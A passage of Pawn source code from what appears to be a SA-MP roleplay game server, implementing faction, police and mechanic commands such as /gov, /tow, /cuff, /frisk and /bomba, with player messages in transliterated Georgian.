		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/subleader [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		if(pData[id][pFraction] && pData[id][pFraction] != pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Motamashe Ukve Aris Sxva Organizaciashi");
		SetPVarInt(playerid,"actsubleader",id);
		new mes2[128];
		strcat(mes2,"Airchiet SubOrganizacia:");
		for(new i;i<3;i++)
		{
			if(strlen(gSubfractionName[frid][i]))
			{
				strcat(mes2,"\n");
				strcat(mes2,gSubfractionName[frid][i]);
			}
		}
		ShowPlayerDialog(playerid,dSubleader,2,"SubOrganizacia",mes2,"Archeva","Daxurva");
	}
	if(!strcmp(cmd,"/gov",true))
	{
		if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Tqven Gadevt Mute");
		if(!pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Organizaciis Wevri");
		new fraction = pData[playerid][pFraction];
		new fractionid = fraction - 1;
		if(fraction != 1 && fraction != 2 && (fraction < 8 || fraction > 9) && fraction != 11 && fraction != 15) return SendClientMessage(playerid,CGRAY,"Es Funqcia Tqventvis Araa Xelmisawvdomi");
		if(!IsAbleToUninvite(playerid)) return SendClientMessage(playerid,CGRAY,"Es Funqcia Tqventvis Araa Xelmisawvdomi");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/gov [Text]");
		if(strlen(tmp) < 1 || strlen(tmp) > 70) return SendClientMessage(playerid,CGRAY,"Texti Dzalian Grdzelia, Daweret Mokle Texti.");
		if(IsIP(tmp) || CheckString(tmp)) return Proverka(playerid, tmp);
		new subid = pData[playerid][pSubfraction]-1;
		new rankid = pData[playerid][pRank]-1;
		if(subid < 0) format(mes,sizeof(mes),"Gov.Siaxle: [%s] %s: %s",gFractionRankName[fractionid][rankid],Name2(playerid),tmp);
		else format(mes,sizeof(mes),"Gov.Siaxle: [%s] %s: %s",gFractionRankName[fractionid][rankid],Name2(playerid),tmp);
		SendClientMessageToAll(0x496985FF,mes);
	}
	if(!strcmp(cmd,"/d",true))
	{
		if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Tqven Gadevt Mute");
		new fraction = pData[playerid][pFraction];
		if(fraction != 2 && (fraction < 8 || fraction > 9) && fraction != 11 && fraction != 15) return SendClientMessage(playerid,CGRAY,"Es Funqcia Tqventvis Araa Xelmisawvdomi");
		if(pData[playerid][pJail]) return SendClientMessage(playerid, CGRAY, "Tqven Xart Cixeshi.");
		new fractionid = fraction - 1;
		new subfraction = pData[playerid][pSubfraction]-1;
		new rankid = pData[playerid][pRank] - 1;
		tmp = strrest(cmdtext,idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/d [Text]");
		if(strlen(tmp) < 1 || strlen(tmp) > 70) return SendClientMessage(playerid,CGRAY,"Texti Dzalian Grdzelia, Daweret Mokle Texti.");
		if(IsIP(tmp) || CheckString(tmp)) return Proverka(playerid, tmp);
		if(subfraction < 0) format(mes,sizeof(mes),"[D] [%s] %s: %s",gFractionRankName[fractionid][rankid],Name2(playerid),tmp);
		else format(mes,sizeof(mes),"[D] [%s] %s: %s",gFractionRankName[fractionid][rankid],Name2(playerid),tmp);
		DepartmentChat(CINFO,mes);
	}
	if(!strcmp(cmd,"/loadgun",true))
	{
		if(pData[playerid][pFraction] != 8 && !IsGang(pData[playerid][pFraction]) && pData[playerid][pFraction] != 9) return SendClientMessage(playerid,CGRAY,"Es Funqcia Tqventvis Araa Xelmisawvdomi");
		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			new vehicleid = GetPlayerVehicleID(playerid);
			if((pData[playerid][pFraction] == 8 && GetVehicleModel(vehicleid) != 433) || ((IsGang(pData[playerid][pFraction]) || pData[playerid][pFraction] == 9) && GetVehicleModel(vehicleid) != 482)) return SendClientMessage(playerid,CGRAY,"Tqven Unda Ijdet Avtomobilis Rultan");
			if(gVehicleGun[vehicleid][vGunLoading] || gVehicleGun[vehicleid][vGunUnloading]) return SendClientMessage(playerid,CGRAY,"Avtomobili Unda Idges Chatvirtvis / Gadmotvirtvis Adgilas");
			gVehicleGun[vehicleid][vGunVid] = vehicleid;
			gVehicleGun[vehicleid][vGunLoading] = true;
			RemovePlayerFromVehicle(playerid);
			new Float:x, Float:y, Float:z, Float:a;
			GetVehiclePos(vehicleid,x,y,z);
			GetVehicleZAngle(vehicleid,a);
			x = x - (-6.0*floatsin(a,degrees));
			y = y - 6.0*floatcos(a,degrees);
			gVehicleGun[vehicleid][vGunPickup] = CreateDynamicPickup(19133,1,x,y,z-0.5);
			format(mes,sizeof(mes),"Metali: {"#cGREEN"}%d\n{"#cWHITE"}Tyviebi: {"#cGREEN"}%d",gVehicleGun[vehicleid][vGunGunAmount],gVehicleGun[vehicleid][vGunAmmo]);
			gVehicleGun[vehicleid][vGunText] = CreateDynamic3DTextLabel(mes,CWHITE,x,y,z+0.5,20.0);
			gVehicleGun[vehicleid][vGunArea] = CreateDynamicSphere(x,y,z,1.0);
			SendClientMessage(playerid,CGREEN,"Chatvirtva Daiwyo");
		}
	}
	if(!strcmp(cmd,"/unloadgun",true))
	{
		if(pData[playerid][pFraction] != 8 && !IsGang(pData[playerid][pFraction]) && pData[playerid][pFraction] != 9) return SendClientMessage(playerid,CGRAY,"Es Funqcia Tqventvis Araa Xelmisawvdomi");
		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			new vehicleid = GetPlayerVehicleID(playerid);
			if((pData[playerid][pFraction] == 8 && GetVehicleModel(vehicleid) != 433) || ((IsGang(pData[playerid][pFraction]) || pData[playerid][pFraction] == 9) && GetVehicleModel(vehicleid) != 482)) return SendClientMessage(playerid,CGRAY,"Tqven Unda Ijdet Avtomobilis Rultan");
			if(gVehicleGun[vehicleid][vGunLoading] || gVehicleGun[vehicleid][vGunUnloading]) return SendClientMessage(playerid,CGRAY,"Avtomobili Unda Idges Chatvirtvis / Gadmotvirtvis Adgilas");
			gVehicleGun[vehicleid][vGunVid] = vehicleid;
			gVehicleGun[vehicleid][vGunUnloading] = true;
			RemovePlayerFromVehicle(playerid);
			new Float:x, Float:y, Float:z, Float:a;
			GetVehiclePos(vehicleid,x,y,z);
			GetVehicleZAngle(vehicleid,a);
			x = x - (-6.0*floatsin(a,degrees));
			y = y - 6.0*floatcos(a,degrees);
			gVehicleGun[vehicleid][vGunPickup] = CreateDynamicPickup(19133,1,x,y,z-0.5);
			format(mes,sizeof(mes),"Metali: {"#cGREEN"}%d\n{"#cWHITE"}Tyviebi: {"#cGREEN"}%d",gVehicleGun[vehicleid][vGunGunAmount],gVehicleGun[vehicleid][vGunAmmo]);
			gVehicleGun[vehicleid][vGunText] = CreateDynamic3DTextLabel(mes,CWHITE,x,y,z+0.5,20.0);
			gVehicleGun[vehicleid][vGunArea] = CreateDynamicSphere(x,y,z,1.0);
			SendClientMessage(playerid,CGREEN,"Gadmotvirtva Daiwyo");
		}
	}
	if(!strcmp(cmd, "/bomba", true))
	{
	    if(GetPVarInt(playerid,"Detonator") == 0) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Xelnaketi Bombi");
	    if(PlayerToPoint(60.0,playerid,-2047.1279,-83.7737,35.1641) || PlayerToPoint(60.0,playerid,1488.0463,-1732.5757,13.3828) ||
		PlayerToPoint(100.0,playerid,1755.0529,-1894.1108,13.5568) || PlayerToPoint(60.0,playerid,1183.7880,-1324.5862,13.5763) ||
		PlayerToPoint(60.0,playerid,1183.7880,-1324.5862,13.5763) || PlayerToPoint(30.0,playerid,1895.2279,-1720.0874,978.6166) ||
		PlayerToPoint(60.0,playerid,1142.6552,-1339.8131,999.2458) || PlayerToPoint(60.0,playerid,2290.1482,-542.9720,100.2575) ||
		PlayerToPoint(60.0,playerid,1080.5520,-280.0794,74.1001) || PlayerToPoint(60.0,playerid,-11.6837,-98.0873,1074.2780) || PlayerToPoint(60.0,playerid,2220.1873,1594.1130,999.9766))
		{
		    SendClientMessage(playerid, CGRAY, "Tqven Ar Shegidzliat Dadot Bombi Am Adgilas. [Mwvane Zona]");
  		}
  		else
  		{
	  		new Float:x, Float:y, Float:z, Float:x2, Float:y2,Float:a;
			GetPlayerPos(playerid,x,y,z);
			GetPlayerFacingAngle(playerid,a);
			x2 = x + (-2.0*floatsin(a,degrees));
			y2 = y + 2.0*floatcos(a,degrees);
			ApplyAnimation(playerid,"BOMBER","BOM_Plant",1.0,1,0,0,0,3000,0);
			format(mes, sizeof(mes), "%s Dadebulia Xelnaketi Bombi. (8 Wamis Shemdeg Afetqdeba) {"#cRED"}[!]", Name2(playerid));
	  		ProxDetector(playerid,mes,0xF754E1FF);
			SetTimerEx("OnDetonate",8000,false,"ffffff",x,y,z,x2,y2,z);
			SetPVarInt(playerid,"Detonator",0);
		}
	}
	if(!strcmp(cmd,"/tow",true))
	{
		if(pData[playerid][pJob] != 4) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Meqaniki");
		if(pTemp[playerid][pMechID] == INVALID_VEHICLE_ID || GetPlayerVehicleID(playerid) != pTemp[playerid][pMechID]) return SendClientMessage(playerid,CGRAY,"Tqven Unda Chaubat Buqsiri");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/tow [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || id == playerid) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		if(GetPlayerState(id) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,CGRAY,"Motamashe Unda Ijdes Avtomobilis Rultan");
		if(GetPlayerDistanceToPlayer(playerid,id) > 10.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		SetPVarInt(playerid,"towoffer",playerid);
		SetPVarInt(playerid,"towoffee",id);
		SetPVarInt(id,"towoffer",playerid);
		SetPVarInt(id,"towoffee",id);
		new towcode = RandomEx(10000,99999);
		SetPVarInt(id,"towcode",towcode);
		SFCM(playerid,CINFO,"Tqven Shestavazet {"#cWHITE"}%s {"#cINFO"}Chaubat Buqsiri Mis Avtomobils",Name2(id));
		SPFD(id,dTow,1,"Buqsiri","OK","CLOSE","{"#cWHITE"}%s Shemogtavazat Chaubas Buqsiri Tqvens Manqanas\nTu Tanaxma Xart \"{"#cLIGHTGREEN"}%d{"#cWHITE"}\" (Frchxilebis Gareshe) Da Daachiret OK",Name2(playerid),towcode);
	}
	if(!strcmp(cmd,"/untow",true))
	{
		if(GetPVarInt(playerid,"towvid"))
		{
			new vehicleid = GetPVarInt(playerid,"towvid");
			new trailer = GetPVarInt(playerid,"towactvid");
			SetPVarInt(playerid,"towvid",0);
			SetPVarInt(playerid,"towactvid",0);
			if(GetVehicleTrailer(vehicleid) == trailer)
			{
				DetachTrailerFromVehicle(vehicleid);
				SendClientMessage(playerid,CGRAY,"Tqveni Manqana Aris Meqanikuri An Avtomatika");
				return true;
			}
		}
		if(pData[playerid][pJob] != 4) return SendClientMessage(playerid,CGRAY,"Tqvenarmushaobt Meqanikosad");
		if(pTemp[playerid][pMechID] == INVALID_VEHICLE_ID || GetPlayerVehicleID(playerid) != pTemp[playerid][pMechID]) return SendClientMessage(playerid,CGRAY,"Tqven Unda Gqondet Buqsiri");
		new vehicleid = GetPlayerVehicleID(playerid);
		new trailer = GetVehicleTrailer(vehicleid);
		if(!trailer) return SendClientMessage(playerid,CGRAY,"Tqven Ar Abuqsirebt Avtomobils");
		DetachTrailerFromVehicle(vehicleid);
		SendClientMessage(playerid,CGRAY,"Tqven Gamoeyavit Avtomobils");
	}
	if(!strcmp(cmd,"/unfill",true))
	{
		if(pData[playerid][pJob] != 4) return SendClientMessage(playerid,CGRAY,"Tqven Ar Mushaobt Meqanikosad");
		if(pTemp[playerid][pMechID] == INVALID_VEHICLE_ID || GetPlayerVehicleID(playerid) != pTemp[playerid][pMechID]) return SendClientMessage(playerid,CGRAY,"Tqven Unda Gqondet Buqsiri");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/tow [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || id == playerid) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		if(GetPlayerState(id) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,CGRAY,"Motamashe Unda Iyos Sachestan.");
		if(GetPlayerDistanceToPlayer(playerid,id) > 10.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Shorsxart Ertmanetisgan");
		SetPVarInt(playerid,"towoffer",playerid);
		SetPVarInt(playerid,"towoffee",id);
		SetPVarInt(id,"towoffer",playerid);
		SetPVarInt(id,"towoffee",id);
		new towcode = RandomEx(10000,99999);
		SetPVarInt(id,"towcode",towcode);
		SFCM(playerid,CINFO,"Tqven shemogtavazes {"#cWHITE"}%s {"#cINFO"}Gtavazobt Sheavsot Sawvavi Avtomobilshi.",Name2(id));
		SPFD(id,dUnfill,1,"Meqaniki","ОК","CLOSE","{"#cWHITE"}%s Gtavazobt Sheavsot Sawvavi Avtomobilshi \nTu Tqven Tanaxmaxart Waxvidet \"{"#cLIGHTGREEN"}%d{"#cWHITE"}\" Daachiret ОК",Name2(playerid),towcode);
	}
	if(!strcmp(cmd,"/repair",true))
	{
		if(pData[playerid][pJob] != 4) return SendClientMessage(playerid,CGRAY,"Tqven Armushaobt MEqanikosad");
		if(pTemp[playerid][pMechID] == INVALID_VEHICLE_ID || GetPlayerVehicleID(playerid) != pTemp[playerid][pMechID]) return SendClientMessage(playerid,CGRAY,"Tqven Unda chaebat Buqsirshi");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/repair [ID Motamashis] [Tanxa]");
		new id = strval(tmp);
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/repair [ID Motamashis] [Tanxa]");
		new price = strval(tmp);
		if(price < 100 || price > 3000) return SendClientMessage(playerid,CGRAY,"Pasi Arunda Iyos 100-Ze Naklebi Da 3000-Ze Meti");
		if(!IsPlayerConnected(id) || id == playerid) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		if(GetPlayerState(id) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,CGRAY,"Motamashe Unda Iyos Avtomobilis Rultan");
		if(GetPlayerDistanceToPlayer(playerid,id) > 10.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Ertmanetisgan Shors Xart");
		SetPVarInt(playerid,"repairoffee",id);
		SetPVarInt(id,"repairoffer",playerid);
		SetPVarInt(id,"repairoffee",id);
		SetPVarInt(id,"repairprice",price);
		SFCM(id,CBLUE,"%s Gtavazobs Tqveni Avtomobilis Sheketebas $%d. ({"#cGREEN"}Y - Datanxmeba, {"#cRED"}N - Uaryopa{"#cBLUE"})",Name2(playerid),price);
		SFCM(playerid,CBLUE,"Tqven Shestavazet %s Sheaketot Misi Avtomobili Fasad: $%d",Name2(id),price);
	}
	if(!strcmp(cmd,"/setspawn",true))
	{
		ShowPlayerDialog(playerid, dSetSpawn, DIALOG_STYLE_LIST, "{"#cYELLOW"}Spawns Shecvla", "1. Sakutari Saxli\n2. Sadgurze / Organizaciis Baza\n3. Sastumros Nomershi", "Archeva", "Uaryopa");
	}
	if(!strcmp(cmd,"/gotome",true))
	{
		if(!IsACop(playerid)) return SendClientMessage(playerid,CGRAY,"Es Punqcia Misawvdomia Mxolod Policiasa da FBI-Stvis");
		tmp = strtok(cmdtext,idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/gotome [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(IsPlayerInAnyVehicle(playerid) || IsPlayerInAnyVehicle(id)) return SendClientMessage(playerid,CGRAY,"Tqven Unda airchiot Motamashe.");
        if(pTemp[id][pCuffee] == id)
        {
            if(GetPlayerDistanceToPlayer(playerid,id) > 10.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Ertmanetisgan Shors Xart");
			new Float:xe, Float:ye, Float:ze;
			GetPlayerPos(playerid,xe,ye,ze);
			SetPlayerPos(id,xe+0.5,ye+0.5,ze);
			SendClientMessage(id,CGRAY,"Tqven Dzalit Gamoatriet.");
        }
        else return SendClientMessage(playerid,CGRAY,"Motamashes Adevs Borkilebi!");
		return true;
	}
	if(!strcmp(cmd,"/su",true) || !strcmp(cmd,"/suspect",true))
	{
		if(!IsACop(playerid)) return SendClientMessage(playerid,CGRAY,"Es Punqcia Xelmisawvdomia Mxolod Policiistvis An FBI-Stvis");
		tmp = strtok(cmdtext,idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/su [ID Motamashis] [Raodenoba] [Mizezi]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		tmp = strtok(cmdtext,idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/su [ID Motamashis] [Raodenoba] [Mizezi]");
		new level = strval(tmp);
		if(level < 1 || level > 6) return SendClientMessage(playerid,CGRAY,"Araswori Dzebnis Done.");
		tmp = strrest(cmdtext,idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/su [ID Motamashis] [Raodenoba] [Mizezi]");
		if(pData[id][pJail]) return SendClientMessage(playerid,CGRAY,"Motamashe Ukve Kapezezea");
		if(level > 3 && pData[playerid][pRank] < 7) return SendClientMessage(playerid,CGRAY,"Tqveni Ranki Unda Agematebodes 3-Ranks");
		new levelt = level * WANTED_TIME;
		if(pData[id][pWanted] >= levelt) return SendClientMessage(playerid,CGRAY,"Motamashes Ukve Sheudzlia Dzebna");
		if(IsACop(id)) return SendClientMessage(playerid,CGRAY,"Organos Tanamshromeli Arsheildzeba Iyos DZebnashi");
		pData[id][pWanted] = levelt;
		UpdatePlayerData(id,"wanted",pData[id][pWanted]);
		SetPlayerWantedLevel(id,level);
		format(mes,sizeof(mes),"%s Tqven Gamogacxades Dzebnashi. Mizezi: %s. Done: %d",Name2(playerid),tmp,level);
		SendClientMessage(id,CBADINFO,mes);
		format(mes,sizeof(mes),"[D] %s Gamocxdebulia Dzebnashi [{"#cWHITE"}%d{"#cDEPARTMENT"}]. Damnashave: %s. Mizezi: %s.",Name2(id),level,Name2(playerid),tmp);
		DepartmentChat(CDEPARTMENT,mes,0,0,1,1,0);
		return true;
	}
	if(!strcmp(cmd,"/tazer",true))
    {
        if(!IsACop(playerid)) return SendClientMessage(playerid,CGRAY,"Es Punqcia Sheudzlia Gamoiyenos Mxolod Policiam An FBI-M");
		if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, CGRAY, "Arsheildzeba Manqanashi Gamoyeneba!");
		new Float:distance;
		new id = GetClosestPlayer(playerid,distance);
		if(distance < 3 && id >= 0)
		{
			if(IsACop(id)) return SendClientMessage(playerid, CGRAY, "Shen Arshegilia Gamoiyeno Amjamad");
			if(IsPlayerInAnyVehicle(id)) return SendClientMessage(playerid, CGRAY, "Moqalaqe Manqanashia!");
			if(GetPVarInt(id,"Tazer") > 0 || pTemp[id][pCuffee] == id) return SendClientMessage(playerid,CGRAY,"Motamashe Ukve Shokirebulia");
			if(pData[playerid][pSex] == 1) format(mes,sizeof(mes),"оглушил %s",Name2(id));
			else format(mes,sizeof(mes),"Gachumda %s",Name2(id));
			MeAction(playerid,mes);
			TogglePlayerControllable(id, 0);
			SetPlayerSpecialAction(id,SPECIAL_ACTION_HANDSUP);
			SetPVarInt(id,"Tazer",1);
			SetTimerEx("Unfreez",20000,false,"i",id);
		}
		else return SendClientMessage(playerid, CGRAY, "Tqvens Irgvliv Aravin Araris");
        return true;
    }
    if(!strcmp(cmd,"/takelic",true))
    {
        if(!IsACop(playerid)) return SendClientMessage(playerid,CGRAY,"Es Punqcia Mxolod Policielma An FBI-M Sheidzleba Gamoiyenos");
        tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/takelic [ID Motamashis][Mizezi]");
		new actplayerid = strval(tmp);
		if(!IsPlayerConnected(actplayerid) || actplayerid == playerid) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(IsACop(actplayerid)) return SendClientMessage(playerid,CGRAY,"Licenziis Ageba Arsheileba Gasamartlebulistvis.");
		if(GetPlayerDistanceToPlayer(playerid,actplayerid) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(actplayerid)) return SendClientMessage(playerid,CGRAY,"Shors Imyopebit Ertmanetisgan");
		if(!pData[actplayerid][pLicenses][LIC_DRIVING]) return SendClientMessage(playerid,CGRAY, "Motamashes Araqvs Licenzia.");
		tmp = strrest(cmdtext,idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY, "/takelic [ID Motamashis][Mizezi]");
		pData[actplayerid][pLicenses][LIC_DRIVING] = 0;
		UpdatePlayerData(actplayerid,"licDrive",0);
		format(mes,sizeof(mes),"%s Tqven Wagertvat Martvis Licenzia. Mizezi: %s",Name2(playerid), tmp);
		SendClientMessage(actplayerid,CBADINFO,mes);
		format(mes, sizeof(mes), "%s %s[%d] Tqven Aiget Martvis Licenzia %s. Mizezi: %s", gFractionRankName[pData[playerid][pFraction]-1][pData[playerid][pRank]-1], Name2(playerid), playerid, Name2(actplayerid), tmp);
		SendFMes(pData[playerid][pFraction],CBLUE, mes);
		return true;
	}
	if(!strcmp(cmd,"/takedrugs",true))
    {
        if(!IsACop(playerid)) return SendClientMessage(playerid,CGRAY,"Es Punqcia Mxolod Policielma An FBI-M Sheidzleba Gamoiyenos");
        tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/takedrugs [ID Motamashis][Mizezi]");
		new actplayerid = strval(tmp);
		if(!IsPlayerConnected(actplayerid) || actplayerid == playerid) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(GetPlayerDistanceToPlayer(playerid,actplayerid) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(actplayerid)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		if(!pData[actplayerid][pDrugs]) return SendClientMessage(playerid,CGRAY, "Motamashes Araqvs Narkotiki");
		tmp = strrest(cmdtext,idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY, "/takedrugs [ID Motamashis][Mizezi]");
        Pokaz(actplayerid,4,pData[actplayerid][pDrugs],0);
		pData[actplayerid][pDrugs] = 0;
		UpdatePlayerData(actplayerid,"Drugs",0);
		format(mes,sizeof(mes),"%s Narkotiki Amogebulia. Mizezi: %s",Name2(playerid), tmp);
		SendClientMessage(actplayerid,CBADINFO,mes);
		format(mes, sizeof(mes), "%s %s[%d] Narkotiki Amogebulia %s. Mizezi: %s", gFractionRankName[pData[playerid][pFraction]-1][pData[playerid][pRank]-1], Name2(playerid), playerid, Name2(actplayerid), tmp);
		SendFMes(pData[playerid][pFraction],CBLUE, mes);
		return true;
	}
	if(!strcmp(cmd,"/frisk",true))
	{
	    if(!IsACop(playerid)) return SendClientMessage(playerid, CGRAY, "Es Punqcia Mxolod Policielma An FBI-M Sheidzleba Gamoiyenos");
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp)) return SendClientMessage(playerid, CGRAY, "/frisk [ID Motamashis]");
	    new id = strval(tmp);
	    if(!IsPlayerConnected(id)) return SendClientMessage(playerid, CGRAY, "Araswori ID");
	    if(GetPlayerDistanceToPlayer(playerid,id) > 10.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
        new str[128];
		format(str, sizeof(str), "Gachxrika %s", Name2(id));
		MeAction(playerid,str);
		new getgun[13],ammox,guns_text[64];
		guns_text = "Ara";
		for(new i=0; i<13; i++)
		{
		    GetPlayerWeaponData(id, i, getgun[i], ammox);
		    if(getgun[i] != 0)
		    {
		        guns_text = "Aqvs";
		        break;
		    }
		}
		format(str,sizeof(str),"\
		{FFFF00}Narkotiki: {FFFFFF}%d GR.\n\
		{FFFF00}Iaragi: {FFFFFF}%s\n\
		{FFFF00}Metali: {FFFFFF}%d\n\
		{FFFF00}Tyviebi: {FFFFFF}%d",
		pData[id][pDrugs], guns_text, pData[id][pGunAmount], pData[id][pAmmo]);
		ShowPlayerDialog(playerid, dMes, DIALOG_STYLE_MSGBOX, "Motamashis Gachxrikva", str, "CLOSE", "");
	}
	if(!strcmp(cmd,"/clear",true))
	{
		if(!IsACop(playerid)) return SendClientMessage(playerid,CGRAY,"Es Punqcia Mxolod Policielma An FBI-M Sheidzleba Gamoiyenos");
		if(pData[playerid][pRank] < 8) return SendClientMessage(playerid,CGRAY,"Araswori Simartle. (Patara shesadzlebloba)");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/clear [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		if(!pData[id][pWanted]) return SendClientMessage(playerid,CGRAY,"Araris Dzebnashi");
		pData[id][pWanted] = 0;
		UpdatePlayerData(id,"wanted",0);
		SetPlayerWantedLevel(id,0);
		format(mes,sizeof(mes),"Tqven Xart Dzebnashi %s",Name2(id));
		SendClientMessage(playerid,CDEPARTMENT,mes);
		format(mes,sizeof(mes),"%s Tqven Mogexsnat Dzebna",Name2(playerid));
		SendClientMessage(id,CDEPARTMENT,mes);
	}
	if(!strcmp(cmd,"/cuff",true))
    {
		if(!IsACop(playerid)) return SendClientMessage(playerid,CGRAY,"Es Punqcia Mxolod Policielma An FBI-M Sheidzleba Gamoiyenos");
		tmp = strtok(cmdtext,idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/cuff [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || id == playerid) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		if(IsACop(id)) return SendClientMessage(playerid,CGRAY,"Arsheidzleba Daado Borkilebi Tanamshromels");
		if(pTemp[id][pCuffee] == id) return SendClientMessage(playerid,CGRAY,"Motamashe Ukve Dakavebulia");
		if(pTemp[playerid][pCuffer] == playerid) return SendClientMessage(playerid,CGRAY,"Tqven Gaqvt Mxolod Erti Borkili");
		if(GetPlayerDistanceToPlayer(playerid,id) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
  		if(GetPVarInt(id,"Tazer") > 0)
		{
			SetPVarInt(id,"Tazer",0);
			TogglePlayerControllable(id,1);
			SetPlayerSpecialAction(id,SPECIAL_ACTION_NONE);
		}
		SetPlayerSpecialAction(id, SPECIAL_ACTION_CUFFED);
        SetPlayerAttachedObject(id, 0, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
		pTemp[id][pCuffee] = id;
		pTemp[id][pCuffer] = playerid;
		pTemp[playerid][pCuffer] = playerid;
		pTemp[playerid][pCuffee] = id;
		MeAction(playerid,"Damnashaves Daedo Borkilebi");
	}
	if(!strcmp(cmd,"/uncuff",true))
    {
		if(!IsACop(playerid)) return SendClientMessage(playerid,CGRAY,"Es Punqcia Mxolod Policielma An FBI-M Sheidzleba Gamoiyenos.");
		tmp = strtok(cmdtext,idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/uncuff [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis.");
		if(GetPlayerDistanceToPlayer(playerid,id) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		if(pTemp[id][pCuffer] == INVALID_PLAYER_ID) return SendClientMessage(playerid,CGRAY,"Motamashes Aradevs Borkilebi.");
		if(pTemp[playerid][pCuffee] != id) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Borkilebis Gasagebi");
		SetPlayerSpecialAction(id,SPECIAL_ACTION_NONE);
		RemovePlayerAttachedObject(id,0);
		pTemp[id][pCuffer] = INVALID_PLAYER_ID;
		pTemp[id][pCuffee] = INVALID_PLAYER_ID;
		pTemp[playerid][pCuffee] = INVALID_PLAYER_ID;
		pTemp[playerid][pCuffer] = INVALID_PLAYER_ID;
		TogglePlayerControllable(id,1);
		MeAction(playerid,"Damnashaves Moexsna Borkilebi.");
	}
	if(!strcmp(cmd,"/unjail",true))
	{
	    if(pData[playerid][pAdmin] < 1) return true;
        tmp = strtok(cmdtext,idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/unjail [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis.");
